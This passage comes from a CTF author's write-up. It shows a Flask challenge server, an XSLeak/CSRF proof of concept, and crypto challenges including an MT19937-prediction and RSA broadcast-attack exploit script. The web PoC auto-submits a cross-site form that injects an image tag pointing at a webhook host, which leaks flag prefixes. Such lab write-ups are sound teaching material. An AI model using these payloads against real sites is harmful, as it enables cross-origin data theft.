<span class="string">&#x27;--disable-gpu&#x27;</span>, <span class="string">&#x27;--no-sandbox&#x27;</span>, <span class="string">&#x27;--disable-popup-blocking&#x27;</span>],</span><br><span class="line">                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)</span><br><span class="line">    timer = threading.Timer(<span class="number">20</span>, terminate_process, [process])</span><br><span class="line">    timer.start()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Admin is visiting your page!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    restrict_remote_addr()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/inner.html&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">    restrict_remote_addr()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;inner.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/guess&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>():</span><br><span class="line">    restrict_remote_addr()</span><br><span class="line"></span><br><span class="line">    guess_str = request.form.get(<span class="string">&#x27;guess&#x27;</span>)</span><br><span class="line">    note = request.form.get(<span class="string">&#x27;note&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> guess_str <span class="keyword">or</span> <span class="keyword">not</span> note:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;invalid payload&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    current_shared = common_prefix(guess_str, FLAG)</span><br><span class="line"></span><br><span class="line">    old = request.cookies.get(<span class="string">&#x27;best&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    old_prefix = <span class="built_in">bytes</span>.fromhex(old.split(<span class="string">&#x27;:&#x27;</span>, <span class="number">1</span>)[<span class="number">0</span>]).decode() <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> old <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    best_prefix = old_prefix <span class="keyword">if</span> <span class="built_in">len</span>(old_prefix) &gt; <span class="built_in">len</span>(current_shared) <span class="keyword">else</span> current_shared</span><br><span class="line"></span><br><span class="line">    resp = make_response(jsonify(&#123;<span class="string">&#x27;best_prefix&#x27;</span>: best_prefix, <span class="string">&#x27;note&#x27;</span>: note&#125;))</span><br><span class="line">    resp.set_cookie(<span class="string">&#x27;best&#x27;</span>, <span class="string">f&quot;<span class="subst">&#123;best_prefix.encode().<span class="built_in">hex</span>()&#125;</span>:<span class="subst">&#123;note.encode().<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p><strong>index.html</strong>  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>GueSS NOT XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.6/purify.min.js&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">body</span> &#123; <span class="attribute">font-family</span>: sans-serif; <span class="attribute">max-width</span>: <span class="number">600px</span>; <span class="attribute">margin</span>: auto; <span class="attribute">padding</span>: <span class="number">1rem</span>; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">input</span>, <span class="selector-tag">button</span> &#123; <span class="attribute">font-size</span>: <span class="number">1rem</span>; <span class="attribute">padding</span>: <span class="number">0.5rem</span>; <span class="attribute">margin</span>: <span class="number">0.5rem</span> <span class="number">0</span>; <span class="attribute">width</span>: <span class="number">100%</span>; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-id">#status-container</span> &#123; <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>; <span class="attribute">padding</span>: <span class="number">1rem</span>; <span class="attribute">border-radius</span>: <span class="number">8px</span>; &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>GueSS NOT XSS<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;status-container&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 改动：form 加上 action 和 method --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;guess-form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/guess&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">      Next guess:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;guess&quot;</span> <span class="attr">id</span>=<span class="string">&quot;guess&quot;</span> <span class="attr">required</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your guess&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">      Your note:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;note&quot;</span> <span class="attr">id</span>=<span class="string">&quot;note-input&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Optional note&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">loadStatus</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">hexDecode</span>(<span class="params">hex</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        hex = hex.<span class="title function_">replace</span>(<span class="regexp">/^0x/</span>, <span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (hex.<span class="property">length</span> % <span class="number">2</span> !== <span class="number">0</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid hex string&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> out = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; hex.<span class="property">length</span>; i += <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          out += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="built_in">parseInt</span>(hex.<span class="title function_">substr</span>(i, <span class="number">2</span>), <span class="number">16</span>));</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> out;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/inner.html&#x27;</span>, &#123; <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span> &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> html = <span class="keyword">await</span> res.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">      html = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;status-container&#x27;</span>).<span class="property">innerHTML</span> = html;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> cookie = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&#x27;; &#x27;</span>).<span class="title function_">find</span>(<span class="function"><span class="params">row</span> =&gt;</span> row.<span class="title function_">startsWith</span>(<span class="string">&#x27;best=&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (cookie) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> val = <span class="built_in">decodeURIComponent</span>(cookie.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> [prefixHex, noteHex] = val.<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> best = <span class="title function_">hexDecode</span>(prefixHex) || <span class="string">&#x27;(none)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> note = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="title function_">hexDecode</span>(noteHex)) || <span class="string">&#x27;(none)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;best-prefix&#x27;</span>).<span class="property">textContent</span> = best;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;note&#x27;</span>).<span class="property">innerHTML</span> = note;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;guess-form&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">async</span> e =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">      e.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> form = e.<span class="property">target</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(form);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(form.<span class="property">action</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: form.<span class="property">method</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: formData</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">loadStatus</span>();</span></span><br><span class="line"><span class="language-javascript">      form.<span class="title function_">reset</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, loadStatus);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p>Every time I deal with a XSLeak challenge, I think it’ll be very usefull to think about what’s the diffrences between a “right” hit and a “wrong” hit.  </p>
<p>In this challenge, is the cookie matters.<br>Nowadays, almost every browser has a limit size for its cookie. Combine this feature with a render functionality in index.html, we can construct an “error-based” XSLeak with an oracle of “if the webhook server is hitted or not”  </p>
<p>Just a piece of PoC:<br><strong>index.php</strong>, which the admin bot will visit  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> win = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;/exp.html&#x27;</span>, <span class="string">&#x27;exploit&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span>, <span class="string">&#x27;exploit&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;, <span class="number">100</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
<p><strong>exp.html</strong>  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;csrfForm&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:5000/guess&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;guess&quot;</span> <span class="attr">value</span>=<span class="string">&quot;NH&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;note&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;h1&gt;NH&lt;/h1&gt;&lt;img src=http://webhook/NH&gt;J&lt;/h1&gt;a.....a&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;csrfForm&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Like this, if <code>NG</code> was hitted on the server, but not <code>NH</code>, then we knows that <code>NH</code> is the prefix part of flag.<br>Later, just automate this approach with a backend server dynamic changing exp.html … should be fine … <del>if my VM wasn’t broken</del><br>So sorry for uploaded an old, unsolvable version on CTFd QwQ  </p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>This was what I said last year…<br><img src="https://hackmd.io/_uploads/Sk22_CuSle.png" alt="image">  </p>
<h3 id="bloCkchAin-ciphEr’S-sERcret"><a href="#bloCkchAin-ciphEr’S-sERcret" class="headerlink" title="bloCkchAin ciphEr’S sERcret"></a>bloCkchAin ciphEr’S sERcret</h3><ul>
<li>Difficuly: 2&#x2F;10</li>
<li>Tips: Baby Blockchain + Baby Caeser Cipher<br>Challenge Description:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">My friend, you know...</span><br><span class="line">There&#x27;re tooooo many of those GPTable Crypto Challenges and Baby Crypto stuffs...</span><br><span class="line">So I implemented a baby one on blockchain!</span><br><span class="line">Sepolia test net, address: 0x9C71c90140162a5BAE7159Ec5CC4C86FAddCBfb6</span><br></pre></td></tr></table></figure>
<strong>chal.sol</strong>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Challenge &#123;</span><br><span class="line">    function encrypt(string memory text) public pure returns (string memory) &#123;</span><br><span class="line">        // some tasty stuffs!</span><br><span class="line">    &#125;</span><br><span class="line">    function get_flag() public pure returns (string memory) &#123;</span><br><span class="line">        // some tasty stuffs!</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
I used Remix IDE, just take it easy if u know some more powerful tools !<br>With some trials, you’ll find out that encrypt is just a caeser cipher with key &#x3D; 7.<br><img src="https://hackmd.io/_uploads/S1iwdp_Blg.png" alt="image"></li>
</ul>
<p>run get_flag and “DECODE” it with key &#x3D; 7 will get the flag  </p>
<h3 id="🐺-Verifier"><a href="#🐺-Verifier" class="headerlink" title="🐺 Verifier"></a>🐺 Verifier</h3><ul>
<li>Difficuly: 6&#x2F;10</li>
<li>Tips: MT19937 + BroadCast Attack</li>
</ul>
<p>Exploit Scripts for the series are from my teammate @wang, thanks a lot to her for testing my challenges.  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">SIZE = <span class="number">64</span></span><br><span class="line">FLAG = bytes_to_long(<span class="string">b&#x27;NHNC&#123;using_big_intergers_in_python_is_still_a_pain&#125;&#x27;</span>)</span><br><span class="line">e = <span class="number">37</span></span><br><span class="line">p, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">while</span> ((p-<span class="number">1</span>)*(q-<span class="number">1</span>)) % e == <span class="number">0</span> :</span><br><span class="line">    p, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line">N = p*q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=== ICEDTEA Verifier 1.0 ===&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    OTP = getrandbits(SIZE)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;signed: <span class="subst">&#123;<span class="built_in">pow</span>(OTP, e, N)&#125;</span>&quot;</span>)</span><br><span class="line">    TRIAL = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;OTP: &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> TRIAL == OTP:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;signed: <span class="subst">&#123;<span class="built_in">pow</span>(FLAG, e, N)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span>    </span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Invalid OTP, <span class="subst">&#123;OTP&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Well… the challenge has three parts!  </p>
<ol>
<li>Predict MT19937 Generator with 64 bits random number generated everytime.  </li>
<li>Obtain N from leaked signatures and OTPs.  </li>
<li>Recover Flag.</li>
</ol>
<p>Step 1 is trivial while MT19937 is just a $GF_2$ linear equation problem, there was like a bunch of exploit scripts online especially for <code>2**32</code> sizes numbers, which can actually be implanted to python random lib as seeds XD  </p>
<p>Step 2:<br>Via $gcd(OTP_1^{37}-signature_1, OTP_2^{37}-signature_2, OTP_3^{37}-signature_3, …) &#x3D; N$<br>Step 3:<br>We can get a bunch of <code>FLAG^37</code> taking mod with different Ns by connect to the server many times, just a simple broadcast attack!  </p>
<p><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> extend_mt19937_predictor <span class="keyword">import</span> ExtendMT19937Predictor</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">n = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">37</span>)):</span><br><span class="line">    r = remote(<span class="string">&#x27;chal.78727867.xyz&#x27;</span>, <span class="number">31337</span>)</span><br><span class="line">    mt = []</span><br><span class="line">    sign = []</span><br><span class="line">    r.recvline()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">        sign.append(<span class="built_in">int</span>(r.recvline().decode().strip().split(<span class="string">&#x27;: &#x27;</span>)[<span class="number">1</span>]))</span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;OTP: &#x27;</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line">        tmp = <span class="built_in">int</span>(r.recvline().strip().split(<span class="string">b&#x27;, &#x27;</span>)[<span class="number">1</span>].decode())</span><br><span class="line">        mt.append(tmp)</span><br><span class="line"></span><br><span class="line">    predictor = ExtendMT19937Predictor()</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> mt:</span><br><span class="line">        predictor.setrandbits(num, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    opt = predictor.predict_getrandbits(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;OTP: &#x27;</span>, <span class="built_in">str</span>(opt).encode())</span><br><span class="line">    sign_flag = <span class="built_in">int</span>(r.recvline().decode().strip().split(<span class="string">&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    c.append(sign_flag)</span><br><span class="line">    N = reduce(gcd, [<span class="built_in">pow</span>(mt[i], <span class="number">37</span>) - sign[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)])</span><br><span class="line">    n.append(N)</span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line">m37 = crt(c, n)</span><br><span class="line">m, ok = iroot(m37, <span class="number">37</span>)</span><br><span class="line"><span class="keyword">if</span> ok:</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<h3 id="🐺-Verifier-1"><a href="#🐺-Verifier-1" class="headerlink" title="🐺 Verifier +"></a>🐺 Verifier +</h3><ul>
